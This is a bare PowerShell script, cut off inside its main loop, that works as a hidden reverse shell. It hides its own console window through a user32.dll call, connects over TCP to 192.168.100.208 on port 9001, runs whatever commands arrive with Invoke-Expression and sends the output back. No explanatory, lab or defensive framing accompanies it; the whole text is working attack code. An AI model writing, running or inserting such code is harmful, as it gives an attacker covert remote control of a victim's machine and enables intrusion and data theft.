Start-Sleep -Seconds 3
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
[Console.Window]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

$ip = "192.168.100.208"
$port = 9001
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$bytes = New-Object Byte[] 65536
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = iex $data 2>&1 | Out-String
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
   
